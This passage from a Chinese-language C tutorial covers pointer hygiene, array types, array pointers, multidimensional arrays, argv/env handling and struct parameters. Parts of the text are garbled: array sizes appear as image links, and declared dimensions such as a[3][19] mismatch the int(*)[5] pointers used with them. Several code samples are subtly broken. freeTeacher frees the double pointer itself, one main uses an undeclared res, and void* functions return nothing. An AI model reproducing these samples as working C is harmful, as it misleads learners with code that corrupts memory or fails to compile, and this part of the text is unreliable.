的等价关系等，我自己也想了一会，也希望大家结合之前的例子仔细的思考一下什么时候应该用二级指针什么时候应该用三级指针，以及他们应该怎么用。</p><p><strong>思考：</strong></p><blockquote><p>我们在写代码的时候有些东西需要注意可以让代码更加简直健壮，就是函数很多都是属于一个入口多个出口的函数，什么意思呢？就是说入口就是函数的调用，出口就是函数的返回（函数的返回在正常和非正常情况是不同的，或者说在不同情况下有不同的返回值），所以很有可能在内存分配到一般的情况下就返回了，那么这个时候，我们分配到一半的的内存就没有机会得到释放，那么时间长了就会出现内存的泄露，于是我们最好在出现问题的时候使用一个goto：END，然后我们在函数的最后使用一个END 标记一个函数块来统一的释放内存。</p></blockquote><p><strong>5.多级指针避免野指针的策略</strong></p><p>（1）初始化的时候如果不直接赋值就赋值为 NULL<br>（2）接收指针参数的时候首先要判段是不是NULL，不是NULL才能继续运行<br>（3）释放内存空间的时候不要忘了在 free掉指针指向的内存空间之后将指针的值重新置为NULL<br>（4）二级指针分配内存空间的时候记得将二级指针的值初始化为0，再来分配一级指针，因为如果我们在一级指针的分配过程中出现问题，提前返回，那么我们在 goto 到 END (也就是我们能强制让他一个出口的那个释放内存模块)以后要根据二级指针的值是不是0来判段有没有分配要不要释放一级指针的内存，然后再把二级指针的内存全部释放掉。</p><h2 id="0X07-数组类型和多维数组的本质"><a href="#0X07-数组类型和多维数组的本质" class="headerlink" title="0X07 数组类型和多维数组的本质"></a><strong>0X07 数组类型和多维数组的本质</strong></h2><h3 id="一、数组的概念："><a href="#一、数组的概念：" class="headerlink" title="一、数组的概念："></a><strong>一、数组的概念：</strong></h3><p>1.元素类型看：数组是<strong>相同类型</strong>变量的有序集合<br>2.从内存角度：是<strong>连续的</strong>一大片内存空间</p><h3 id="二、数组的初始化："><a href="#二、数组的初始化：" class="headerlink" title="二、数组的初始化："></a><strong>二、数组的初始化：</strong></h3><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    int a[] = &#123;1,2&#125;;    int b[100] = &#123;1,2,3&#125;;//这些都是在编译器静态编译的时候就确定的    int c[200] = &#123;0&#125;;    memset(c,0,sizeof(c));//在编译后才显示地重置内存块    return 0;&#125;</code></pre><h3 id="三、数组名的技术盲点"><a href="#三、数组名的技术盲点" class="headerlink" title="三、数组名的技术盲点"></a><strong>三、数组名的技术盲点</strong></h3><p>（1）数组首元素的地址和数组的地址是两个不同的概念<br>（2）数组名代表着数组首元素的地址，是一个<strong>指针常量</strong></p><p>**简单的解释一下这个问题：**数组定义以后在静态编译的时候就已经分配好内存了，是不会再进行改变的，因此编译器将数组的名字作为一个指针常量</p><p>（3）数组首元素的地址和数组的地址是相等的<br>（4）对数组名取地址规定得到的是整个数组的地址<br>（5）如何表达数组这种数据类型</p><h3 id="四、数组数据类型"><a href="#四、数组数据类型" class="headerlink" title="四、数组数据类型"></a><strong>四、数组数据类型</strong></h3><p>数组数据类型是一种非常规的数据类型，我们要换一种思考角度（我们类比指针的数据类型，指针的数据类型是它指向的内存的内容的数据类型）</p><p>（1）数组的数据类型是由数组元素的数据类型和数组的长度共同决定的<br>（2）比如  int array<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A0%86%E5%8C%BA%E7%9A%84%E7%90%86%E8%A7%A32.png">10</a> 的数据类型是  int<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A0%86%E5%8C%BA%E7%9A%84%E7%90%86%E8%A7%A32.png">10</a></p><blockquote><p><strong>回忆：</strong></p><p>类型的本质：固定大小的内存块的别名</p></blockquote><p><strong>1.使用typedef 给数组设置别名</strong></p><p>先解释一下，数组的特殊之处：</p><p>数组这种数据类型一开始就不单纯，别的数据类型都是单纯的，比如 int  char 啥的，但是数组这个数据类型一开始就是带着别名的（标签），那么别名是什么，我们以下面这个最常见的数组为例：</p><p>int (array)<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A0%86%E5%8C%BA%E7%9A%84%E7%90%86%E8%A7%A32.png">10</a>  ———–&gt;  数据类型实际上就是 int<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A0%86%E5%8C%BA%E7%9A%84%E7%90%86%E8%A7%A32.png">10</a> ，这个array 就是 int<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A0%86%E5%8C%BA%E7%9A%84%E7%90%86%E8%A7%A32.png">10</a>的别名</p><p>有了这个基础我们看下面的例子：</p><p>array a ————&gt;  int a<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A0%86%E5%8C%BA%E7%9A%84%E7%90%86%E8%A7%A32.png">10</a></p><p>相当于给 array  又找了一个别名替换了之前 array 的名字</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    int i = 0;    typedef int (myArray)[10];    myArray array = &#123;0&#125;;    for(i=0;i&lt;10;i++)&#123;        array[i] = i+1;    &#125;    for(i=0;i&lt;10;i++)&#123;        printf(&quot;%d\n&quot;,array[i]);    &#125;    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">12345678910</code></pre><p>我们可以再验证一下之前的判段：array 和 &amp;array 的数据类型是不一样的， 何以见得？请看代码：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    int i = 0;    typedef int (myArray)[10];    myArray array = &#123;0&#125;;    for(i=0;i&lt;10;i++)&#123;        array[i] = i+1;    &#125;    printf(&quot;array:%p,array+1:%p\n&quot;,array,array+1);    printf(&quot;&amp;array:%p,&amp;array+1:%p\n&quot;,&amp;array,&amp;array+1);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">array:0061FF04,array+1:0061FF08&amp;array:0061FF04,&amp;array+1:0061FF2C</code></pre><p>可以清楚的看到  array 虽然和 &amp;array 代表的都是数组的首地址，但是array+1 移动4个字节，&amp;array+1 移动40个字节 </p><p><strong>2.定义一个数组指针</strong></p><p><strong>(1)方法一：通过数组类型来定义数组指针</strong></p><p>数组指针就是一个指向数组类型变量的指针，那么我们应该如何定义呢？我们还是做一个类比：</p><p>我们原来这么写：</p><p>int* a —————-&gt; 定义一个指向 Int类型变量的指针 a ，那我们假如现在需要定义一个指向数组类型的变量的指针 b 应该怎么写？ 我想聪明的你应该立刻能反应过来</p><pre><code class="hljs">typedef int (arrayType)[10];arrayType* b;</code></pre><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    int i = 0;    typedef int (myArray)[10];    myArray array = &#123;0&#125;;    myArray* p = NULL;    for(i=0;i&lt;10;i++)&#123;        array[i] = i+1;    &#125;    p = &amp;array;    for(i=0;i&lt;10;i++)&#123;        printf(&quot;%d\n&quot;,(*p)[i]);    &#125;    return 0;&#125;</code></pre><p><strong>（2）方法二：声明一个数组指针类型</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    int i =0;    typedef int (myArray)[10];    typedef int (*pointer)[10];    myArray  array=&#123;0&#125;;    pointer p = NULL;    p  = &amp;array;    for(i=0;i&lt;10;i++)&#123;        (*p)[i] = i;        printf(&quot;%d&quot;,(*p)[i]);    &#125;    return 0;&#125;</code></pre><p><strong>（3）方法三：直接声明一个数组指针变量</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    int i = 0;    int (*pointer)[10];    int myArray[10] = &#123;0&#125;;    pointer = &amp;myArray;    for(i=0;i&lt;10;i++)&#123;        (*pointer)[i] = i;        printf(&quot;%d\n&quot;,(*pointer)[i]);    &#125;    return 0;&#125;</code></pre><h3 id="五、多维数组的本质"><a href="#五、多维数组的本质" class="headerlink" title="五、多维数组的本质"></a><strong>五、多维数组的本质</strong></h3><p>二维数组名其实和指向一维（低维）数组的指针是等价的，我们以下面的代码为例</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    int i = 0,j = 0;    int a[3][19] =&#123;0&#125;;    int(*pointer)[5] = NULL;    for(i=0;i&lt;3;i++) &#123;        for (j = 0; j &lt; 5; j++) &#123;            a[i][j] = i + j;        &#125;    &#125;    pointer = a;    for(i=0;i&lt;3;i++)&#123;        for(j=0;j&lt;5;j++)&#123;            printf(&quot;%d&quot;,pointer[i][j]);        &#125;        printf(&quot;\n&quot;);    &#125;    printf(&quot;a:%p,a+1:%p\n&quot;,a,a+1);    printf(&quot;&amp;a:%p,&amp;a+1：%p\n&quot;,&amp;a,&amp;a+1);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">012341234523456a:0061FEE8,a+1:0061FEFC&amp;a:0061FEE8,&amp;a+1：0061FF24</code></pre><p>可以看到我们可以直接用一维数组指针变量来代替二维数组的数组名进行操纵数组</p><p>如果还有些抽象我们可以看下面这个示意图：</p><p><strong>示意图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%A4%9A%E7%BB%B4%E6%95%B0%E7%BB%84%E6%9C%AC%E8%B4%A8.png" alt="此处输入图片的描述"></p><p>我们再做一个简单的分析：</p><p>如果说 a 是二维数组的名字，将每一个低维都看成是一个数组（假设存在第0行），<strong>如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A1%A8%E7%A4%BA.png" alt="此处输入图片的描述"></p><p>1.(a+i) 表示整个第i行的地址<br>2.<em>(a+i) 表示第i行首元素的地址<br>3.</em>(a+i)+j 表示第i行第j列的地址，等价于 &amp;a[i][j]<br>4.<em>(</em>(a+i)+j) 第i行第j列元素的值</p><h3 id="六、多维数组做函数参数的退化问题"><a href="#六、多维数组做函数参数的退化问题" class="headerlink" title="六、多维数组做函数参数的退化问题"></a><strong>六、多维数组做函数参数的退化问题</strong></h3><p>既然我们已经知道了多维数组的本质，那么我们就进行函数封装并进行传递</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;void* printArray(int(*p)[5])&#123;    int i = 0,j = 0;    for(i=0;i&lt;3;i++)&#123;        for(j=0;j&lt;5;j++)&#123;            printf(&quot;%d&quot;,*(*(p+i)+j));        &#125;        printf(&quot;\n&quot;);    &#125;&#125;int main() &#123;    int a[3][22] = &#123;0&#125;;    int(*p)[5] = NULL;    int i = 0,j = 0;    p = a;    for(i=0;i&lt;3;i++)&#123;        for(j=0;j&lt;5;j++)&#123;            *(*(p+i)+j) = i+j;        &#125;    &#125;    printArray(a);    return 0;&#125;</code></pre><h3 id="七、证明二维数组在内存空间上是连续的"><a href="#七、证明二维数组在内存空间上是连续的" class="headerlink" title="七、证明二维数组在内存空间上是连续的"></a><strong>七、证明二维数组在内存空间上是连续的</strong></h3><p>虽然我们在理解的时候将二维数组理解成好几个数组，但是实际上在内存中二维数组的存储是连续的， 那么怎么证明呢？那我们只要用指针连续打印就行了</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;void* printArray(int* array,int num)&#123;    int i = 0;    for(i =0;i&lt;num;i++)&#123;        printf(&quot;%d&quot;,array[i]);    &#125;&#125;int main() &#123;    int a[3][23] = &#123;0&#125;;    int(*p)[5] = NULL;    int i = 0,j = 0;    p = a;    for(i=0;i&lt;3;i++)&#123;        for(j=0;j&lt;5;j++)&#123;            *(*(p+i)+j) = i+j;        &#125;    &#125;    printArray((int*)a,15);    return 0;&#125;</code></pre><p>结果：</p><pre><code class="hljs">012341234523456</code></pre><h3 id="八、数组做函数参数的等价关系"><a href="#八、数组做函数参数的等价关系" class="headerlink" title="八、数组做函数参数的等价关系"></a><strong>八、数组做函数参数的等价关系</strong></h3><p>char a[30]  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;  char* p<br>char* a[30] &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; char** p<br>char a[10][30] &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; char (*p)[30]</p><h3 id="九、指针数组的应用场景"><a href="#九、指针数组的应用场景" class="headerlink" title="九、指针数组的应用场景"></a><strong>九、指针数组的应用场景</strong></h3><p>这里面涉及到一些比较绕的知识，我们再来强化一下：</p><p>比如我们定义：</p><pre><code class="hljs">char* ppp[] = &#123;&quot;11&quot;,&quot;222&quot;,&quot;333&quot;&#125;;</code></pre><p><strong>几个点需要明确的：</strong></p><p>（1）ppp 相当于是一个二级指针，为啥呢？因为这是一个指针数组，数组里面的元素全部是指针， 而ppp是数组的地址，于是是指针的指针，就是二级指针。<br>（2）*(ppp+i) 得到的才是一级指针<br>（3）我们如何计算指针数组的长度，我们的方法是使用数组的sizeof值去除以一级指针的sizeof值（一级指针的sizeof值为4），如下</p><pre><code class="hljs">num = sizeof(ppp)/sizeof(*ppp);/sizeof(ppp)/sizeof(ppp[0]);</code></pre><p>（4）ppp+1 移动的是4字节，但是 &amp;ppp+1移动的是12字节</p><p><strong>应用：命令行参数</strong></p><p>可能有人已经注意到了main函数有时会带一些奇奇怪怪的参数，但是main函数作为函数的入口是被谁调用并且传参的呢？</p><p>**答案：**当你双击一个应用程序的时候，操作系统首先会为这个程序分配内存，main 函数是操作系统和程序交互的入口，操作系统会把我们对这个程序的一些操作通过参数的形式传递给应用程序（比如说我们在命令行传递给函数的参数）</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main(int argc,char* argv[],char** env)&#123;    int i = 0;    printf(&quot;====================argv======================\n&quot;);    for(i=0;i&lt;argc;i++)&#123;        printf(&quot;%s\n&quot;,argv[i]);    &#125;    printf(&quot;=====================env=======================\n&quot;);    for(i=0;env[i]!=NULL;i++)&#123;        printf(&quot;%s\n&quot;,env[i]);    &#125;    return 0;&#125;</code></pre><p><strong>简单的解释：</strong><br>（1）argc 会自动计算出传入的参数的个数<br>（2）argv[] 这个指针数组会接收命令行以空格传递的参数<br>（3）env 会将环境变量的所有的值全部收入囊中（env会自动在最后一个环境变量的后面加一个 NULL&#x2F;0&#x2F;‘\0’ 这样方便判断结束，我们称这种能力叫做指针数组的自我结束能力）</p><h3 id="十、指针数组的自我结束能力："><a href="#十、指针数组的自我结束能力：" class="headerlink" title="十、指针数组的自我结束能力："></a><strong>十、指针数组的自我结束能力：</strong></h3><p>指针数组预定俗成在最后添加NULL&#x2F;0&#x2F;‘\0’，这样就能很方便的实现遍历的结束而不用计算指针的个数</p><p><strong>先来举一个反例：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    int i = 0;    char* ppp[] = &#123;&quot;111&quot;,&quot;222&quot;,&quot;3333&quot;&#125;;    for(i=0;ppp[i]!=NULL;i++)&#123;        printf(&quot;%s\n&quot;,ppp[i]);    &#125;    return 0;&#125;</code></pre><p>这段代码运行完以后就会宕掉，因为原始的指针数组不具有自我结束能力，于是我们需要手动添加一个结束标志，可以是 0 ‘\0’ 或者 NULL</p><p>其实0才是最原始的，\0只是因为在字符串里面才需要转义，而 NULL 是在宏定义中规定了等于0</p><p><strong>代码示例:</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;int main() &#123;    int i = 0;    char* ppp[] = &#123;&quot;111&quot;,&quot;222&quot;,&quot;3333&quot;,0&#125;;    for(i=0;ppp[i]!=NULL;i++)&#123;        printf(&quot;%s\n&quot;,ppp[i]);    &#125;    return 0;&#125;</code></pre><h2 id="0X08-结构体在项目开发中的实际应用"><a href="#0X08-结构体在项目开发中的实际应用" class="headerlink" title="0X08 结构体在项目开发中的实际应用"></a><strong>0X08 结构体在项目开发中的实际应用</strong></h2><h3 id="一、回忆一下结构体的一些基本概念"><a href="#一、回忆一下结构体的一些基本概念" class="headerlink" title="一、回忆一下结构体的一些基本概念"></a><strong>一、回忆一下结构体的一些基本概念</strong></h3><p>如何定义结构体并初始化：</p><p><strong>示例代码1：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;struct Teacher&#123;//数据类型是固定大小内存块的别名，但是现在还是没有分配内存    int id;    int age;    char name[64];&#125;;int main() &#123;    struct Teacher t1;//这里开始分配内存    return 0;&#125;</code></pre><p><strong>示例代码2：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Teacher&#123;//数据类型是固定大小内存块的别名，但是现在还是没有分配内存    int id;    int age;    char name[64];&#125;Teacher;int main() &#123;    Teacher t1;    return 0;&#125;</code></pre><h3 id="二、结构体定义变量的三种方法："><a href="#二、结构体定义变量的三种方法：" class="headerlink" title="二、结构体定义变量的三种方法："></a><strong>二、结构体定义变量的三种方法：</strong></h3><p><strong>第一种：通过类型定义：</strong></p><p>上面代码已经演示过，不在赘述</p><p><strong>第二种：定义结构体的同时定义变量：</strong></p><pre><code class="hljs">struct Teacher&#123;    int id;    int age;    char name[64];&#125;t1,t2;//定义类型的同时定义变量</code></pre><p><strong>第三种：使用匿名结构体</strong></p><pre><code class="hljs">struct &#123;    int id;    int age;    char name[64];&#125;t1,t2;//定义一个匿名结构体</code></pre><h3 id="三、结构体初始化变量的三种方法："><a href="#三、结构体初始化变量的三种方法：" class="headerlink" title="三、结构体初始化变量的三种方法："></a><strong>三、结构体初始化变量的三种方法：</strong></h3><p><strong>第一种：定义完以后初始化</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;struct Teacher&#123;    int id;    int age;    char name[64];&#125;;int main() &#123;    struct Teacher t1 = &#123;1,23,&quot;hhh&quot;&#125;;    return 0;&#125;</code></pre><p><strong>第二种：直接在定义过程中初始化：</strong></p><pre><code class="hljs">struct &#123;    int id;    int age;    char name[64];&#125;t1 = &#123;1,23,&quot;K0rz3n&quot;&#125;;</code></pre><p><strong>或者</strong></p><pre><code class="hljs">struct Teacher&#123;    int id;    int age;    char name[64];&#125;t1 = &#123;1,23,&quot;K0rz3n&quot;&#125;;</code></pre><h3 id="四、结构体的（-）操作"><a href="#四、结构体的（-）操作" class="headerlink" title="四、结构体的（.）操作"></a><strong>四、结构体的（.）操作</strong></h3><p>结构体变量用来操纵自己的属性的符号</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Teacher&#123;    int age;    char name[64];&#125;Teacher;int main() &#123;    Teacher t1;    t1.age = 23;    strcpy(t1.name,&quot;sam hello&quot;);    printf(&quot;name:%s\n&quot;,t1.name);    return 0;&#125;</code></pre><p>那么t1.是什么含义呢？有没有操纵内存呢？</p><blockquote><p>答： t1.age 实际上是在计算 age 相对于 t1 的偏移量，是CPU在运算，并没有操纵内存，操纵内存的时间是在等于号赋值的时候</p></blockquote><h3 id="五、结构体的（-）操作"><a href="#五、结构体的（-）操作" class="headerlink" title="五、结构体的（-&gt;）操作"></a><strong>五、结构体的（-&gt;）操作</strong></h3><p>结构体指针变量用来操纵指针所指向的对象的属性的操作符</p><p><strong>示例代码:</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Teacher&#123;    int age;    char name[64];&#125;Teacher;int main() &#123;    Teacher t1;    Teacher t2 = &#123;24,&quot;XDSEC&quot;&#125;;    Teacher* p = NULL;    t1.age = 23;    strcpy(t1.name,&quot;sam hello&quot;);    printf(&quot;name:%s\n&quot;,t1.name);    p = &amp;t2;    printf(&quot;t2.age:%d\nt2.name:%s\n&quot;,p-&gt;age, p-&gt;name);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">name:sam hellot2.age:24t2.name:XDSEC</code></pre><p>那么p-&gt;是什么含义呢？有没有操纵内存呢？</p><blockquote><p>答： p-&gt;age 实际上是在计算 age 相对于 t2 的偏移量，是CPU在运算，并没有操纵内存，操纵内存的时间是在等于号赋值的时候</p></blockquote><h3 id="六、结构体元素做参数-结构体指针做参数"><a href="#六、结构体元素做参数-结构体指针做参数" class="headerlink" title="六、结构体元素做参数&amp;&amp;结构体指针做参数"></a><strong>六、结构体元素做参数&amp;&amp;结构体指针做参数</strong></h3><p><strong>1.编译器支持直接的 &#x3D; 赋值操作</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Teacher&#123;    int age;    char name[64];&#125;Teacher;int main() &#123;    Teacher t1 = &#123;25,&quot;Tom&quot;&#125;;    Teacher t2;    t2 = t1;    printf(&quot;age:%d\nname:%s\n&quot;,t2.age,t2.name);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">age:25name:Tom</code></pre><p><strong>2.我们做参数直接传进函数试一试：</strong></p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Teacher&#123;    int age;    char name[64];&#125;Teacher;void* copyTeacher(Teacher to ,Teacher from)&#123;    to = from;    printf(&quot;toage:%d\ntoname:%s\n&quot;,to.age,to.name);&#125;int main() &#123;    Teacher t1 = &#123;25,&quot;Tom&quot;&#125;;    Teacher t2;    Teacher t3;    t2 = t1;    printf(&quot;t2age:%d\nt2name:%s\n&quot;,t2.age,t2.name);    copyTeacher(t3,t1);    printf(&quot;t3age:%d\nt3name:%s\n&quot;,t3.age,t3.name);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">t2age:25t2name:Tomtoage:25toname:Tomt3age:0t3name:</code></pre><p>发现我们直接传进去并没有用，其实也很好理解，我们传进去的时候创建了新的栈空间，于是修改的也不是原来的栈空间，于是我们还是需要使用指针来改变原来地址的值</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Teacher&#123;    int age;    char name[64];&#125;Teacher;void* copyTeacher(Teacher* to ,Teacher from)&#123;    *to = from;    printf(&quot;toage:%d\ntoname:%s\n&quot;,(*to).age,(*to).name);&#125;int main() &#123;    Teacher t1 = &#123;25,&quot;Tom&quot;&#125;;    Teacher t2;    Teacher t3;    t2 = t1;    printf(&quot;t2age:%d\nt2name:%s\n&quot;,t2.age,t2.name);    copyTeacher(&amp;t3,t1);    printf(&quot;t3age:%d\nt3name:%s\n&quot;,t3.age,t3.name);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">t2age:25t2name:Tomtoage:25toname:Tomt3age:25t3name:Tom</code></pre><h3 id="七、结构体数组做函数参数："><a href="#七、结构体数组做函数参数：" class="headerlink" title="七、结构体数组做函数参数："></a><strong>七、结构体数组做函数参数：</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Teacher&#123;    int age;    char name[64];&#125;Teacher;void* printArray(Teacher* p,int num)&#123;    int i = 0;    for(i=0;i&lt;num;i++)&#123;        printf(&quot;your name is :%d\n&quot;,p[i].age);    &#125;&#125;int main() &#123;    int i =0;    int num = 3;    Teacher array[num];    for(i=0;i&lt;num;i++)&#123;        printf(&quot;\nplease enter your age:&quot;);        scanf(&quot;%d&quot;,&amp;(array[i].age));    &#125;    printArray(array,num);    return 0;&#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">please enter your age:1818please enter your age:1212please enter your age:1313your name is :18your name is :12your name is :13</code></pre><p>我们现在将其按照老师的年龄进行排序：</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Teacher&#123;    int age;    char name[64];&#125;Teacher;void* printArray(Teacher* p,int num)&#123;    int i = 0;    for(i=0;i&lt;num;i++)&#123;        printf(&quot;your name is :%d\n&quot;,p[i].age);    &#125;&#125;void* sortArray(Teacher* p, int num)&#123;    int i = 0,j = 0;    Teacher tmp;    for(i=0;i&lt;num;i++)&#123;        for(j=i+1;j&lt;num;j++)&#123;            if(p[i].age &gt; p[j].age)&#123;                tmp= p[j];                p[j] = p[i];                p[i] = tmp;            &#125;        &#125;    &#125;&#125;int main() &#123;    int i =0;    int num = 3;    Teacher array[num];    for(i=0;i&lt;num;i++)&#123;        printf(&quot;\nplease enter your age:&quot;);        scanf(&quot;%d&quot;,&amp;(array[i].age));    &#125;    printf(&quot;排序前:\n&quot;);    printArray(array,num);    sortArray(array,num);    printf(&quot;排序后:\n&quot;);    printArray(array,num);    return 0;&#125;</code></pre><p>通过malloc 的方式初始化结构体数组</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Teacher&#123;    int age;    char name[64];&#125;Teacher;void* printArray(Teacher* p,int num)&#123;    int i = 0;    for(i=0;i&lt;num;i++)&#123;        printf(&quot;your name is :%d\n&quot;,p[i].age);    &#125;&#125;void* sortArray(Teacher* p, int num)&#123;    int i = 0,j = 0;    Teacher tmp;    for(i=0;i&lt;num;i++)&#123;        for(j=i+1;j&lt;num;j++)&#123;            if(p[i].age &gt; p[j].age)&#123;                tmp= p[j];                p[j] = p[i];                p[i] = tmp;            &#125;        &#125;    &#125;&#125;Teacher* createTeacher(int num)&#123;    Teacher* tmp = NULL;    tmp = (Teacher*)malloc(sizeof(Teacher)*num);    if(tmp == NULL)&#123;        return NULL;    &#125;    return tmp;&#125;int freeTeacher(Teacher** p)&#123;    if(p == NULL)&#123;        return -1;    &#125;    free(p);    *p = NULL;    return 0;&#125;int main() &#123;    int i =0;    int num = 3;    Teacher* tmp = NULL;    tmp = createTeacher(num);    for(i=0;i&lt;num;i++)&#123;        printf(&quot;\nplease enter your age:&quot;);        scanf(&quot;%d&quot;,&amp;(tmp[i].age));    &#125;    printf(&quot;排序前:\n&quot;);    printArray(tmp,num);    sortArray(tmp,num);    printf(&quot;排序后:\n&quot;);    printArray(tmp,num);    return 0;&#125;</code></pre><p>调用二级指针：</p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Teacher&#123;    int age;    char name[64];&#125;Teacher;void* printArray(Teacher* p,int num)&#123;    int i = 0;    for(i=0;i&lt;num;i++)&#123;        printf(&quot;your name is :%d\n&quot;,p[i].age);    &#125;&#125;void* sortArray(Teacher* p, int num)&#123;    int i = 0,j = 0;    Teacher tmp;    for(i=0;i&lt;num;i++)&#123;        for(j=i+1;j&lt;num;j++)&#123;            if(p[i].age &gt; p[j].age)&#123;                tmp= p[j];                p[j] = p[i];                p[i] = tmp;            &#125;        &#125;    &#125;&#125;int createTeacher(Teacher** p,int num)&#123;    Teacher* tmp = NULL;    tmp = (Teacher*)malloc(sizeof(Teacher)*num);    if(tmp == NULL)&#123;        return -1;    &#125;    *p = tmp;    return 0;&#125;int freeTeacher(Teacher** p)&#123;    if(p == NULL)&#123;        return -1;    &#125;    free(p);    *p = NULL;    return 0;&#125;int main() &#123;    int i =0;    int num = 3;    Teacher *tmp = NULL;    res = createTeacher(&amp;tmp,num);    if(res != 0)&#123;        printf(&quot;func createTeacher has somethong wrong , please check and try again&quot;);        return -1;    &#125;    for(i=0;i&lt;num;i++)&#123;        printf(&quot;\nplease enter your age:&quot;);        scanf(&quot;%d&quot;,&amp;(tmp[i].age));    &#125;    printf(&quot;排序前:\n&quot;);    printArray(tmp,num);    sortArray(tmp,num);    printf(&quot;排序后:\n&quot;);    printArray(tmp,num);    freeTeacher(&amp;tmp);    return 0;&#125;</code></pre><h3 id="八、结构体套一级指针"><a href="#八、结构体套一级指针" class="headerlink" title="八、结构体套一级指针"></a><strong>八、结构体套一级指针</strong></h3><p><strong>示例代码：</strong></p><pre><code class="hljs">#include &quot;stdio.h&quot;#include &quot;stdlib.h&quot;#include &quot;string.h&quot;typedef struct Teacher&#123;    int age;    char name[64];    char* aliasname;&#125;Teacher;void* printArray(Teacher* p,int num)&#123;    int i = 0;    for(i=0;i&lt;num;i++)&#123;        printf(&quot;your name is :%d\n&quot;,p[i].age);    &#125;&#125;void* sortArray(Teacher* p, int num)&#123;    int i = 0,j = 0;    Teacher tmp;    for(i=0;i&lt;num;i++)&#123;        for(j=i+1;j&lt;num;j++)&#123;            if(p[i].age &gt; p[j].age)&#123;                tmp= p[j];                p[j] = p[i];                p[i] = tmp;            &#125;        &#125;    &#125;&#125;int createTeacher(Teacher** p,int num)&#123;    int i = 0;    Teacher* tmp = NULL;    tmp = (Teacher*)malloc(sizeof(Teacher)*num);    if(tmp == NULL)&#123;        return -1;    &#125;    memset(tmp,0,sizeof(Teacher)*num);    for(i=0;i&lt;num;i++)&#123;        tmp[i].aliasname = (char*)malloc(128);    &#125;    *p = tmp;    return 0;&#125;int freeTeacher(Teacher* p,int num)&#123;//这里的free 函数使用的是一级指针    int i;    if(p == NULL)&#123;        return -1;    &#125;    